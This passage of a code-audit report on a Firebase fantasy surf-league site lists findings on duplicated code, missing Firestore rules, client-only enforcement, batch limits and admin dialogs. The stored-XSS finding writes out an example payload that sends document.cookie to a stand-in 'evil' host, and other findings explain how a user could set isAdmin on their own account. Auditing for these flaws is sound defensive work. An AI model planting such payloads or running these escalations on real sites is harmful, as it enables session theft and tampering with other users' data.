- **Evidence:** Each of these is exported but its only call site is within the same file (verified: zero import statements name them, static + dynamic-import aware): scoring.js — MEN_SCORING, WOMEN_SCORING (used only at scoring.js:27,38), floorPointsForAlive (scoring.js:170), aliveCountFromResults (scoring.js:168); ui.js — openProfileEditModal (only ui.js:309); wsl-scrape.js — discoverRounds (only wsl-scrape.js:357), fetchRoundHeats (only wsl-scrape.js:370); db.js — fetchEventsVersion (only db.js:50); wsl-resolve.js — normalizeName (only wsl-resolve.js:18); pricing.js — clampValue (only pricing.js:74,76,147). Also firebase-config.js:23 re-exports `app`, which is never imported anywhere (only db/auth/storage are consumed externally); `app` is used solely internally to init the others.
- **Impact:** Not dead code — all are live — but the `export` keyword overstates each module's public contract. It makes the real, intentionally-shared API (e.g. scoreTeam, projectTeam) harder to distinguish from internal helpers, and invites accidental external coupling to internals.
- **Recommendation:** Optional, low-priority: drop the `export` keyword on the internal-only helpers so each module's exports reflect its actual public surface. Leave MEN_SCORING/WOMEN_SCORING and `app` exported if you consider them deliberate/conventional (Firebase apps commonly re-export `app`). This is housekeeping, not a correctness issue — fine to defer.

#### F-42 · ⚪ INFO · effort: trivial · ✅ verified (high conf.)

**Several scouting-suspected orphans are actually LIVE assets (do not remove)**

- **Category:** verification
- **Evidence:** data/wsl_results/*.json: fetched at runtime — data.html:209-218 and surfers.html:208-217 both `tryFetch('./data/wsl_results/wsl_20XX_{mens,womens}.json')`. img/loadpage.jpg: used as fixed page background in js/ui.js:720 `background:url('img/loadpage.jpg')...` AND as OG/Twitter image in index.html:11,17. data/photos/*.png: this directory is the source for surfer `photoUrl` values (admin.html:334 placeholder `data/photos/john-john-florence.png`; rendered via `s.photoUrl ? <img> :` in team.html:643, index.html:148, event.html:156, profile.html). The photoUrl strings live in Firestore (not inspectable here), so the dir as a whole is live.
- **Impact:** Prevents a costly mistake: these look like bootstrap leftovers but deleting any would break the Data page, Surfers page, the site background, link-preview cards, or surfer photos. Flagging so they are explicitly excluded from cleanup.
- **Recommendation:** Keep all three. Two minor sub-notes worth a glance, not action: (a) admin.html:334's photo placeholder uses a full-name slug `john-john-florence.png` that does not exist — the real files use abbreviated slugs like `italo_f.png` — so the example hint is misleading; (b) data/photos/stock_surfer.png has no code reference as a fallback (the render path falls back to text initials, not an image), so it may be a genuinely unused single asset — verify against Firestore before deleting.


### DRY / Duplication

#### F-43 · 🟠 HIGH · effort: small · ✅ verified (high conf.)

**SEASON=2026 hardcoded in 8 HTML pages while ui.js derives it dynamically — guaranteed divergence at season rollover**

- **Category:** Duplicated business constant
- **Evidence:** Identical `const SEASON = 2026;` appears in club.html:31, admin.html:44, event.html:30, profile.html:30, index.html:40, standings.html:30, surfers.html:119, team.html:256. But js/ui.js:189 (renderBanners) uses `const SEASON = new Date().getFullYear();`. Today (2026-06-17) both equal 2026, masking the bug; on 2027-01-01 ui.js's banner will query the 2027 event while every page still reads 2026 data — silent split-brain.
- **Impact:** At season rollover the site banner and the page bodies disagree on which season is current, and updating the season requires editing 8 files (easy to miss one). This is the exact 'magic constant duplicated in each HTML page' the task flags, with an added correctness hazard because the two encodings (literal vs getFullYear()) drift on a date, not on an edit.
- **Recommendation:** Single canonical home: export `SEASON` (or `getCurrentSeason()`) from a shared module — js/config.js or alongside getTeamRules in team.js — and import it in every page and in ui.js. Decide deliberately whether it's a pinned literal (manual rollover) or derived from the date, but make all 9 sites use the one definition.

#### F-44 · 🟠 HIGH · effort: medium · ✅ verified (high conf.)

**data.html and surfers.html are two copies of the same historical-results feature (locations, fetch, indexing, place-badge)**

- **Category:** Copy-paste page logic
- **Evidence:** Byte-identical `CURRENT_SEASON_LOCATIONS` array in data.html:191 and surfers.html:143. Identical `const tryFetch = (url) => fetch(url).then(r => r.ok ? r.json() : null).catch(() => null);` at data.html:205 / surfers.html:205, followed by the identical 8-file fetch block (wsl_2022..2025_mens/womens) at data.html:209-218 / surfers.html:208-217. `buildIndices()` bodies are identical apart from a cosmetic `events` vs `events: evts` rename (data.html:229 vs surfers.html:149). The `.place-badge` CSS rule is identical in both inline <style> blocks (data.html:14 / surfers.html:14), and both define placeBadge()/sort-by-last-name (data.html:254 / surfers.html:173).
- **Impact:** Any change to the historical dataset (a new season's JSON, a new venue, a fix to the indexing) must be made in two places and will silently rot in one. This is the single largest body of duplicated knowledge in the repo.
- **Recommendation:** Extract a js/wsl-history.js module exporting CURRENT_SEASON_LOCATIONS, a loadHistory() that does the tryFetch + 8-file fetch + buildIndices, and placeBadge()/ordinal helpers; move the shared .place-badge / .place-* rules into fantasy.css. Both pages then import the same loader and differ only in presentation.

#### F-45 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Roster-strip rendering + name helpers duplicated across index.html, team.html, profile.html**

- **Category:** Repeated rendering helper
- **Evidence:** `splitName` + `nameLabelHtml` are byte-identical in index.html:117-131 and team.html:291-304 — team.html's own comment at line 290 says '── Name-split helpers (mirror dashboard) ──'. team.html:679 has a THIRD inline variant of the same first/last split. profile.html:168 defines its own `shortName` (initials form) and its own roster loop. All three pages also hardcode roster size: index.html:137 `rosterSize = tour === 'womens' ? 5 : 8`, profile.html:174 same, team.html:310 same — duplicating TEAM_RULES in team.js (getTeamRules already exists and team.html even imports it at line 252, then ignores it at 310).
- **Impact:** The roster strip is the app's core surface; three independent copies mean visual/logic drift (one already uses initials, two use first/last) and any change to roster size or name formatting must touch all three. The hardcoded 5/8 bypasses the single source of truth in team.js.
- **Recommendation:** Move splitName/nameLabelHtml (and a shortName variant) into ui.js next to padToSparseRoster, and have all three pages import them. Replace every inline `tour === 'womens' ? 5 : 8` with `getTeamRules(tour).rosterSize`.

#### F-46 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**#c0392b (already defined as --color-error) hardcoded ~30 times across CSS and HTML instead of using the token**

- **Category:** Duplicated design token
- **Evidence:** fantasy.css:26 defines `--color-error: #c0392b;`, yet the literal `#c0392b` recurs 12 more times in the same stylesheet (e.g. lines 358, 362, 364, 515, 807, 1456, 1475, 1696) and in HTML inline styles (team.html:26-27,195,583; admin.html:399,1795,1815,1830,1851; club.html:361). The value-change tags re-encode the same red as `rgba(192,57,43,0.85)` (fantasy.css:1425). All are literally the same red as the token.
- **Impact:** Rebranding or tweaking the error red requires a find-replace across CSS + multiple HTML files instead of one token edit; near-misses are easy (a stray #c0392c would go unnoticed). Violates the project's stated pixel-consistency / single-shared-source bar.
- **Recommendation:** Replace every hardcoded #c0392b in CSS with var(--color-error). For inline-style attributes that need it, prefer a CSS class over an inline hex. Same exercise for the success-green family (#217a3c / #dff5e3 / #2e7d32 / #3a6b1f / #d6ebca) which currently has NO token — add --color-success and --color-success-bg and route all those through it.

#### F-47 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**club.html re-implements the canonical best-9-of-N season-scoring math instead of using scoring.js**

- **Category:** Duplicated business rule
- **Evidence:** js/scoring.js owns the rule (calculateSeasonStandings, with the magic `9` at scoring.js:240 `scores.slice(0, 9)` and the tiebreaker at :251). club.html:266 independently re-implements it: `scores.sort((a,b)=>b-a)` then `scores.slice(0, 9).reduce(...)` inside its rank-progression loop, with the same hardcoded 9. standings.html correctly imports from db.js/scoring.js; club.html is the outlier.
- **Impact:** If the league ever changes best-9 to best-8 (or the tiebreaker changes), scoring.js and club.html diverge silently and the club page's trajectory chart would rank players by a different rule than the official standings — a subtle, high-trust bug in derived data.
- **Recommendation:** Export the per-event-subset scoring helper (or a `bestNOf(scores)` using the same DROP/BEST constant) from scoring.js and call it from club.html's progression loop, so the `9` lives in exactly one place.

#### F-48 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**Rank-trajectory sparkline (toPoint + makeLine + SVG scaffold) duplicated between index.html and club.html**

- **Category:** Repeated rendering helper
- **Evidence:** Near-identical `toPoint`/`makeLine` SVG sparkline builders: index.html:270-285 and club.html:286-300 share the same `toPoint = (ranks,i)=>{ x = pad.l + ... ; y = pad.t + ((ranks[i]-1)/(maxRank-1))*chartH }` and the same polyline+circle `makeLine`, differing only in parameterized stroke/dot size (index uses lineW/dotR vars, club hardcodes 1 / 1.5).
- **Impact:** Two copies of a non-trivial coordinate-mapping chart; a fix to the y-scaling or empty-data handling must be applied twice. Already drifted (hardcoded vs parameterized line width).
- **Recommendation:** Extract a `renderRankSparkline({ ranks, maxRank, maxEvents, lineW, dotR })` into ui.js and call it from both pages.

#### F-49 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**Countdown DHMS-format + timezone-offset parsing duplicated (index.html vs ui.js), sharing a global with a collision risk**

- **Category:** Duplicated logic + shared global
- **Evidence:** index.html:200 `getDeadlineMs` parses `tradingCloseTimezone` via `parseInt(...,10)` then builds an ISO offset string (lines 201-205); ui.js:61-65 (resolveCountdownState) does the same parse via `parseFloat(...)` plus minute handling — two encodings of the same rule that already differ (int vs float offsets). Both then format DHMS independently (index.html:210 formatCountdown vs ui.js:163 tick). Worse, both write the SAME global: index.html:399/411 set `window._countdownInterval` and ui.js:196/209 clear/set it. On the dashboard both run, so one ticker can clear the other's interval.
- **Impact:** The lock-badge countdown (index) and the site-banner countdown (ui.js) can stomp each other's interval, leaving one stuck. The duplicated tz parse means a fractional-hour timezone (e.g. +05:30) works in one path and not the other.
- **Recommendation:** Move the timezone-offset→ms parse into one shared helper (e.g. ui.js `deadlineMsFor(ev)`) used by both paths, and give each ticker its own named interval handle instead of the shared window._countdownInterval. A single DHMS `formatCountdown` in ui.js can serve both.

#### F-50 · 🔵 LOW · effort: small · ⚠️ partial (high conf.)

**Tour display label `tour === 'womens' ? "Women's" : "Men's"` re-typed ~15 times instead of a shared helper**

- **Category:** Repeated formatter
- **Evidence:** The same ternary appears at admin.html:382, 394, 576, 774, 982, 1322, 1499, 1784 (and a local-only `labelOf` at admin.html:833 used in just 3 spots), plus data.html:334 ('Men's CT'/'Women's CT'), surfers.html:309, profile.html:174. Variants mix 'Men's' / 'Men's CT' / 'M'/'W' (admin.html:139) inconsistently.
- **Impact:** Low correctness risk but pure repetition and a source of label inconsistency (CT suffix present or not). A one-line helper would dedupe ~15 sites and standardize the label.
- **Recommendation:** Add `tourLabel(tour, { short = false } = {})` to ui.js and import it everywhere a Men's/Women's label is produced.
- **⚠️ Verifier correction:** Genuine tour-label ternaries: admin.html 382, 394, 576, 982, 1499, 1784 (bare "Women's"/"Men's"); 774 ("Women's CT"/"Men's CT"); 833 (labelOf arrow, used 835-837); 1322 (reversed polarity); 139 ("W"/"M"); team.html:476 (bare); data.html:334 ("Men's CT"/"Women's CT"). REFUTED citations: surfers.html:309 is a hardcoded button label (its ternary is a CSS-class toggle), and profile.html:174 is `? 5 : 8` roster size, not a label. Many pages (profile 315-336, surfers 308-309, club 374-375, standings 173-174, about 129-138, index, team tabs) hardcode "Men's CT"/"Women's CT" literals instead of using a ternary. No tour-label helper exists in js/ui.js. Recommendation stands; a shared `tourLabel()` would consolidate both the ternaries and the hardcoded literals.

#### F-51 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**surfers.html re-implements formatSalary inline despite importing from ui.js**

- **Category:** Repeated formatter
- **Evidence:** ui.js:346 exports `formatSalary`. surfers.html:117 imports from ui.js (`renderHeader, renderFooter, showAuthGate, showLoading, locationForEvent`) but NOT formatSalary, then at surfers.html:445 hand-rolls it: `$${surfer.value ? (surfer.value/1_000_000).toFixed(2) + "M" : "—"}` — the same $X.XXM format the shared helper produces.
- **Impact:** Trivial but it's the exact pattern the audit targets (a formatter reimplemented inline next to its own import line). If formatSalary's format changes (e.g. drop trailing zeros), surfers.html silently won't follow.
- **Recommendation:** Import formatSalary from ui.js in surfers.html and use it at line 445.

#### F-52 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**Identical <head> boilerplate (preconnect + Google Fonts link + fantasy.css + favicon + apple-touch-icon) repeated verbatim in all 10 pages**

- **Category:** Duplicated HTML boilerplate
- **Evidence:** The 6-line block (2× rel=preconnect, the identical `fonts.googleapis.com/css2?family=Inter...&family=Lora...` link, fantasy.css, icon, apple-touch-icon) is byte-identical across about/admin/club/data/event/index/profile/standings/surfers/team .html (e.g. font link at *.html:9, fantasy.css at :10, favicon at :11-12). Confirmed identical via grep across all 10.
- **Impact:** Real but bounded by the no-build constraint: there is intentionally no template engine, so this cannot be DRY'd into a partial without adding a build step the project deliberately avoids. Changing the font or favicon means editing 10 files. Worth acknowledging as accepted duplication rather than 'fixing'.
- **Recommendation:** Leave as-is unless a build step is ever introduced; it is a deliberate trade-off of the static no-build architecture. If churn becomes painful, a tiny prebuild that injects a shared <head> partial would be the lowest-disruption option — but do not add tooling solely for this.


### Security

#### F-53 · 🔴 CRITICAL · effort: medium · ✅ verified (high conf.)

**No version-controlled Firestore/Storage security rules; entire server-side authorization model is invisible and unverifiable**

- **Category:** Authorization / data integrity
- **Evidence:** find across the repo (tracked + untracked) returns zero rules files: no firestore.rules, firebase.json, storage.rules, or .firebaserc. git ls-files shows only js/firebase-config.js and data JSON. The code explicitly delegates all enforcement to console-managed rules: firebase-config.js:8 "security is enforced by Firestore rules + Auth"; admin.html:1106 "Team operations may fail if Firestore rules don't allow admin writes". All app-side guards are client-only (auth.js requireAuth/requireAdmin redirect via window.location.href — trivially bypassed by calling db.js functions directly from the console).
- **Impact:** If the console rules are absent, in test-mode, or misconfigured, ANY authenticated (or unauthenticated) user can issue direct Firestore writes that bypass every UI check: set their own users/{uid}.isAdmin=true (auth.js:142 only sets it false on create — nothing stops a later client write), overwrite surfers/events/results/leaderboard, edit another user's teams/{otherUid}_{eventId} doc to inject a winning roster after results are known, or harvest every user's email from the users collection. Because the rules live only in the console, they cannot be code-reviewed, diffed, or restored if the project is recreated — there is no audit trail proving the datastore is actually locked down. This is the dominant risk for a product that may take money/ads.
- **Recommendation:** Commit firestore.rules + firebase.json to the repo as the single source of truth and deploy via firebase deploy. At minimum: users/{uid} writable only by request.auth.uid==uid with isAdmin made immutable from the client (or admin-only); teams/{docId} writable only when docId starts with request.auth.uid AND the matching event's tradingOpen==true; surfers/events/results/leaderboard/config/meta writable only when get(users/{auth.uid}).isAdmin==true; clubs writable per membership. Add storage.rules so avatars/{uid} is writable only by that uid. Even if good rules already exist in the console, version-controlling them is non-negotiable for review/restore.

#### F-54 · 🟠 HIGH · effort: medium · ✅ verified (high conf.)

**Stored XSS via user-controlled teamName and avatarUrl rendered unescaped on standings/club/profile/nav**

- **Category:** XSS
- **Evidence:** openProfileEditModal (ui.js:664-688) writes teamName and avatarUrl straight to the user doc via updateUser; the only constraint is a client-side maxlength=30 on the input (ui.js:601), bypassable by a direct write. These fields are copied verbatim into the leaderboard (admin.html:658-660) and player directory (admin.html:1929-1931), then rendered with innerHTML and NO escaping: standings.html:139 `<strong>...${p.teamName}</strong>`, :140 `${p.displayName}`, :136 `<img src="${p.avatarUrl}">`; club.html:415 `${entry.teamName||entry.displayName}`; profile.html:306-307; nav header ui.js:284. No escapeHtml/DOMPurify exists in ui.js or the page controllers (grep confirms escapeHtml is defined only locally in admin.html).
- **Impact:** A teamName of `<img src=x onerror=fetch('//evil/'+document.cookie)>` (or an avatarUrl of `x" onerror="...`) persists in Firestore and executes in every other player's browser when they open the standings or their club page — and in the admin's browser. Combined with the missing rules, an attacker can plant the payload directly without even using the 30-char-limited input. This is wormable across the whole user base from one profile edit.
- **Recommendation:** Add a single escapeHtml() helper in ui.js and run every user/remote-sourced string through it at the innerHTML interpolation sites (teamName, displayName, club name, event name, surfer name), or build those nodes with textContent/createElement. For avatarUrl, validate it is an https:// URL (reject javascript:/data: and stray quotes) before storing and before interpolating into src. Mirror the same escaping admin.html already applies to scraped strings.

#### F-55 · 🟠 HIGH · effort: medium · ✅ verified (high conf.)

**Client-side-only enforcement of trading lock, salary cap, and roster rules — bypassable, lets users edit teams after results are known**

- **Category:** Game integrity
- **Evidence:** team.html:1064 validateTeam() (team.js) and the tradingOpen re-check (team.html:1072-1078) run purely in the browser, then call saveTeam(user.uid, eventId, ...) (db.js:153). saveTeam does setDoc with merge:true and no validation of surfers/totalSpent/salaryCap/locked. lockTeamsForEvent (db.js:168-175) only sets a `locked` flag the client can ignore. Nothing server-side ties the team doc to tradingOpen or to a valid cap-compliant roster.
- **Impact:** Without Firestore rules mirroring these invariants, a user can write teams/{uid}_{eventId} directly: pick surfers over the $50M/$35M cap, exceed the roster size, ignore the $4M alternate cap, or — most damaging — submit/alter a roster AFTER the event's results are public (the leaderboard recalc reads whatever roster is stored), guaranteeing a top score. The careful client-side fresh-event re-check is defeated by simply not using the UI.
- **Recommendation:** Encode the core invariants in Firestore rules: teams writes only when the referenced event tradingOpen==true and not locked, and roster size/cap can be sanity-checked in rules (or via a Cloud Function on write). Even a coarse "no team write once event.tradingOpen==false" rule closes the after-the-fact-edit exploit, which is the integrity-critical one.

#### F-56 · 🟠 HIGH · effort: small · ✅ verified (high conf.)

**isAdmin is a self-writable user-doc field; admin status depends entirely on a rule that isn't in the repo**

- **Category:** Privilege escalation
- **Evidence:** ensureUserProfile (auth.js:138-148) creates the user doc with isAdmin:false, but updateUser (db.js:341) does an unrestricted updateDoc(doc(db,'users',userId), data) and requireAdmin (auth.js:194-217) trusts whatever isAdmin value the user's own doc currently holds (re-fetched each load). There is no code path that prevents a client from writing {isAdmin:true} to its own users doc.
- **Impact:** If the (uncommitted) Firestore rules don't explicitly make isAdmin immutable from the client, any user can self-elevate to admin with one console write, then legitimately load admin.html and rewrite surfers/events/results/leaderboard for the whole league. Admin gating is only as strong as a rule no one in this repo can see.
- **Recommendation:** In the committed rules, disallow client writes to users.isAdmin entirely (allow update only if request.resource.data.isAdmin == resource.data.isAdmin), and grant admin solely via console/Cloud Function or custom auth claims. Consider migrating admin checks to Firebase Auth custom claims so isAdmin never lives in a client-writable doc at all.

#### F-57 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**Live-status banner injects WSL-scraped statusColor/eventName/message into innerHTML and a style context without escaping**

- **Category:** XSS (third-party content)
- **Evidence:** renderLiveStatusBanner (ui.js:143-148) builds the banner with innerHTML interpolating status.statusColor into `background:${status.statusColor}` and status.eventName/statusLabel/statusMessage into markup. statusColor comes from regex-parsing a remote style attribute (wsl-scrape.js:451-453); the text fields use .textContent (HTML-neutral) but eventName is the scraped venue name. Unlike the admin scrape preview, this public banner path applies no escapeHtml.
- **Impact:** Lower severity because it requires WSL's own site to serve a malicious style/value (or a MITM of the plaintext-parsed HTML), not direct attacker input. But statusColor flows into a CSS context where `red;background:url(javascript:...)`-style breakouts or attribute-breaking content could affect every visitor. It is an unsanitized third-party-content sink on a public, unauthenticated render path.
- **Recommendation:** Validate statusColor against a strict pattern (e.g. /^#?[0-9a-fA-F]{3,8}$|^[a-z]+$/) before use, and escape eventName/statusLabel/statusMessage with the same helper used elsewhere. Cheap defense-in-depth against WSL markup changes.

#### F-58 · ⚪ INFO · effort: small · ✅ verified (high conf.)

**Firebase web config exposed in client is expected; no secret material is leaked**

- **Category:** Secrets / config
- **Evidence:** firebase-config.js:9-16 contains apiKey/authDomain/projectId/storageBucket/appId — all standard public Firebase web-app identifiers. No service-account JSON, private keys, admin SDK credentials, or tokens are present anywhere in the repo (grep of js/ and data/ found none). messagingSenderId is set to a measurement-ID-looking value ("G-CEY04638EW") which is a config nit, not a leak.
- **Impact:** None directly — these values are designed to ship to browsers and are not secrets. The real exposure is downstream (the data they reach) and is fully governed by the missing Firestore/Storage rules, covered above. Worth stating plainly so effort isn't wasted 'hiding' the API key.
- **Recommendation:** Leave the web config as-is; do not attempt to obfuscate it. Instead, lock the API key in Google Cloud console (HTTP referrer restriction to gladtobebrad.github.io + restrict to the Firebase APIs actually used) and enable App Check to blunt scripted abuse of the open scrape/write surface. Fix the messagingSenderId value for correctness.

#### F-59 · ⚪ INFO · effort: small · _opinion (not falsifiable)_

**Several positive controls worth preserving: fresh-read trading re-check, atomic leaderboard recalc, and escaped scrape previews**

- **Category:** Strengths
- **Evidence:** team.html:1072-1078 fetches getEventFresh() and aborts the save if tradingOpen flipped (cache-bypass guards a real race). db.js:109 getEventFresh and the version-gated caches (db.js:75-92, 271-288) avoid stale-tab exploits. admin.html defines escapeHtml (1315) and applies it to all scraped surfer names/warnings/event names in the WSL and reprice previews (1327-1347, 1795-1860). The player directory snapshot deliberately omits email (admin.html:1925-1931).
- **Impact:** These show the author already reasons about staleness-as-exploit and remote-string injection in the admin tooling. The gap is consistency: the same escaping discipline isn't applied to the public render paths, and none of the client checks are backed server-side.
- **Recommendation:** Promote admin.html's escapeHtml into ui.js as a shared export and use it everywhere user/remote data hits innerHTML; treat the existing fresh-read pattern as the template for what the Firestore rules should also enforce. No change needed to the controls themselves — extend their coverage.


### Reliability

#### F-60 · 🔴 CRITICAL · effort: large · ✅ verified (high conf.)

**No version-controlled Firestore security rules — all data-integrity enforcement is client-side only**

- **Category:** security/data-integrity
- **Evidence:** No firestore.rules or firebase.json exists in the repo (find returned nothing). firebase-config.js:8 asserts 'security is enforced by Firestore rules + Auth', but no rules are checked in. purchasePrice is read straight from a DOM data attribute (team.html:722 `const value = parseInt(btn.dataset.value, 10)` → 728 `roster[idx] = { surferId: id, purchasePrice: value }`) and written verbatim by saveTeam (db.js:153-161). validateTeam (team.js:23) and the trading-lock re-check (team.html:1072-1078) run only in the browser.
- **Impact:** If Firestore rules are absent or permissive, a user can craft a write that bypasses the salary cap, alternate ALT_CAP, roster size, trading lock, and even write directly to leaderboard/results — corrupting standings for everyone. The carefully built getEventFresh TOCTOU mitigation is defeated by any client that skips it. Even if rules ARE configured in the Firebase console, they are not in source control, cannot be reviewed/diffed, and can silently regress with no record.
- **Recommendation:** Add a firestore.rules file to the repo and deploy it: lock teams/ writes to request.auth.uid == userId AND the event's tradingOpen==true (read the event doc in the rule), make leaderboard/results/surfers/events/config admin-only (request.auth.token or a users/{uid}.isAdmin lookup), and validate cap/roster invariants server-side. At minimum, commit the current console rules so they are reviewable and versioned.

#### F-61 · 🟠 HIGH · effort: medium · ✅ verified (high conf.)

**Every writeBatch commits unchunked — leaderboard recalc, clearAllTeams, and carry-forward fail atomically past 500 ops**

- **Category:** reliability/scalability
- **Evidence:** No batch chunking anywhere (grep for 500/chunk found none). recalcLeaderboardForTour builds one batch.set per user PLUS one batch.delete per orphan in a single batch (admin.html:709-729). clearAllTeams (db.js:179-182), lockTeamsForEvent (db.js:170-174), carryForwardTeams (db.js:245-257), and saveResultsBatch (db.js:130-135) likewise commit one batch with no size guard. Firestore caps writeBatch at 500 operations.
- **Impact:** Once the league exceeds ~500 users (leaderboard: users + orphans) or ~500 team docs (clearAllTeams), batch.commit() throws. For the leaderboard the failure is atomic, so the entire tour silently fails to update and the admin sees 'Men's FAILED' with no path to success short of code change. This is a hard scaling ceiling with no graceful degradation.
- **Recommendation:** Chunk every batch into <=450-op commits (a small helper: accumulate ops, commit, start a fresh batch). For the leaderboard, accept that multi-batch loses cross-batch atomicity and compensate by ordering sets-before-deletes and bumping the version only after all commits succeed.

#### F-62 · 🟡 MEDIUM · effort: small · ⚠️ partial (high conf.)

**Persisted-projection path (admin recalc) lacks the hasElimination guard that the display path uses, and event.fieldSize is never written**

- **Category:** scoring-integrity
- **Evidence:** event.html:73-78 gates projection on `hasElimination = results.some(r => !r.withdrawn && Number.isFinite(r.finish))` AND passes `event.fieldSize ?? null`. The canonical persisted path, recalcLeaderboardForTour, calls `projectTeam(team, results, tour)` with no fieldSize and no hasElimination guard (admin.html:682). When isInProgress(ev) is true but no surfer has been eliminated yet, aliveCountFromResults returns null (scoring.js:140) → floorAlive=0 → projectTeam credits 0 to every alive surfer — the exact inverted-leaderboard behavior projectTeam exists to prevent. Separately, `event.fieldSize` is referenced in event.html:78 but never written by any save path (the WSL save persists only resultsEntered/resultsSource/roundsCompleted/totalRounds at admin.html:1540-1545), so it is permanently undefined — a dead reference whose intended accuracy boost never engages.
- **Impact:** For the brief window after an event flips live and gets a results doc but before the first elimination, the persisted leaderboard can show all live teams at their locked-in floor of 0, temporarily inverting standings — the precise UX defect the projection was designed to fix. The unwired fieldSize means the alive-count derivation is always the finish-based fallback, which is correct but never as precise as the doc implies.
- **Recommendation:** Mirror event.html in the recalc: compute hasElimination and only use projectTeam when it holds (else skip writing a score for that live event, or write locked-in only). Either start writing event.fieldSize during the WSL save or remove the dead `event.fieldSize ?? null` reference so the two paths agree.

#### F-63 · 🟡 MEDIUM · effort: medium · ✅ verified (high conf.)

**Trading toggle: lock/unlock + team operations are not transactional, leaving a half-applied state on partial failure**

- **Category:** data-integrity
- **Evidence:** In the toggle handler, saveEvent({tradingOpen}) commits first (admin.html:1093), then a SEPARATE try/catch does carryForwardTeams + lockTeamsForEvent + popularity snapshot (admin.html:1107-1140). If the second block throws, the catch only toasts a warning ('Trading locked, but team operations failed') — tradingOpen is already persisted but teams are NOT locked (lockTeamsForEvent sets a per-team `locked` flag, db.js:168-175). lockTeamsForEvent is itself a multi-update batch with no atomicity vs the event write.
- **Impact:** Event shows trading locked while individual team docs still have locked:false — users editing in an open tab may still save (their getEventFresh check catches tradingOpen, so the lock holds via that path, making the per-team locked flag partly redundant; but any consumer reading team.locked sees stale data). The popularity snapshot can also be skipped on a transient error with only a warning, leaving the Surfers popularity column empty after a 'successful' lock.
- **Recommendation:** Either fold the event-flag write into the same logical operation as team ops with a clear recovery toast that names exactly what succeeded, or make the per-team `locked` flag fully derived from event.tradingOpen (it largely already is via getEventFresh) and drop the separate lockTeamsForEvent write to remove the dual-source-of-truth.

#### F-64 · 🟡 MEDIUM · effort: small · ✅ verified (high conf.)

**Destructive admin actions still use native confirm() despite the project standard requiring themed confirmModal()**

- **Category:** ux/consistency
- **Evidence:** CLAUDE.md:102 and the MEMORY feedback_admin_dialogs note state confirmModal() replaces window.confirm() for non-trivial admin actions. Yet native confirm() remains on the most destructive action — Reset All Teams (admin.html:1918, 'delete ALL team rosters for every user and event') — plus Delete Event (933), Delete Surfer (1246), Delete Club (1276), Clear Results (1681), and Leave/Delete Club (club.html:513).
- **Impact:** Inconsistent, un-themed dialogs on irreversible operations; native confirm() is also suppressible by the browser ('prevent this page from creating additional dialogs') after repeated use, which on Reset All Teams could let a misclick wipe every roster with no prompt. Lower-friction than the multi-step confirmModal the rest of admin uses, raising accidental-destruction risk.
- **Recommendation:** Convert these to confirmModal() with confirmTone:'danger'; for Reset All Teams add a type-to-confirm or two-step pattern given it is the single most destructive action in the app.

#### F-65 · 🔵 LOW · effort: small · ✅ verified (high conf.)

**carryForwardTeams and getPreviousTeam can read the events list back through a stale cache after their own cache-bust**

- **Category:** reliability/correctness
- **Evidence:** carryForwardTeams removes only `events_${season}` from sessionStorage (db.js:199) then calls getEvents(season). But getEvents (db.js:46-64) gates on meta/events.version, and the trading toggle bumps that version via touchEventsVersion only AFTER all team ops complete (admin.html:1141, well after carryForwardTeams runs at 1108). The handler does keep the in-memory `events` array in sync (admin.html:1098), but carryForwardTeams re-fetches independently via getEvents and relies on tradingOpen===false of the JUST-locked event to find source rosters — that locked event's tradingOpen was written at 1093, so the removeItem+refetch is what saves it, not the version gate.
- **Impact:** Currently correct because the removeItem forces a Firestore re-read, but the safety depends on a subtle ordering: the version doc is NOT yet bumped when getEvents runs, so any other long-lived tab keeps a stale events cache until the later touchEventsVersion. The dependence on removeItem (tab-local) rather than the version gate (global) is fragile and easy to break in a refactor.
- **Recommendation:** Have carryForwardTeams/getPreviousTeam accept the already-loaded freshEvents array from the caller instead of re-fetching, eliminating the cache-ordering dependency entirely; or bump touchEventsVersion immediately after the tradingOpen write so the gate (not removeItem) guarantees freshness.

#### F-66 · 🔵 LOW · effort: trivial · ✅ verified (high conf.)

**club.html member fetch is all-or-nothing: a single missing/failed getUser rejects the whole render, and null member docs are cached**

- **Category:** error-handling
- **Evidence:** club.html:183-185 does `await Promise.all(club.memberIds.map(async uid => { memberDocs[uid] = await getUser(uid) }))`. getUser returns null for a missing doc (db.js:336-339) with no per-member try/catch, so one rejected read fails the entire Promise.all and the club view errors out; a null is stored and then JSON-serialized into the sessionStorage cache (186), persisting the gap for the cache lifetime.
- **Impact:** A club with one deleted/permission-denied member doc breaks the whole clubhouse for all members until cache expiry, rather than degrading to 'unknown member'. The cached null can also surface as a member row with missing displayName downstream.
- **Recommendation:** Wrap each getUser in a try/catch returning a placeholder ({displayName:'Unknown'}) so one bad member can't take down the view; skip caching null entries.

#### F-67 · ⚪ INFO · effort: trivial · _opinion (not falsifiable)_

**Well-built: leaderboard recalc integrity contract matches the code, and the trading-save TOCTOU re-check is correct**

- **Category:** reliability (positive)
- **Evidence:** recalcLeaderboardForTour computes entirely in memory, pre-flights empty tours (admin.html:649-651), fetches results+teams via Promise.all before any write (668-670), skips ghost teams for unregistered users (681), and commits sets+orphan-deletes in one atomic batch per tour wrapped in per-tour try/catch (709-729, 813-820) — faithfully matching CLAUDE.md:64-75. The version-doc cache pattern (db.js:271-288, 75-92) is correctly read-fresh-every-call to avoid the stale-long-lived-tab bug it documents. team.html:1070-1082 re-reads getEventFresh immediately before saveTeam and aborts if tradingOpen flipped. Reprice idempotency via valuePrev/lastPricedEvent (admin.html:1772-1774, 1898-1899) is sound.
- **Impact:** These are the highest-stakes data paths and they are genuinely robust against partial writes, stale caches, and the common trading race — no change needed here beyond the server-side enforcement gap noted separately.
- **Recommendation:** No action required; preserve these patterns. The only reason any of it is exploitable is the missing Firestore rules (separate finding), not the client logic.


### Accessibility / UX

#### F-68 · 🟠 HIGH · effort: small · ✅ verified (high conf.)

**Primary CTA button and pervasive .text-muted text fail WCAG AA contrast**

- **Category:** Accessibility / color contrast
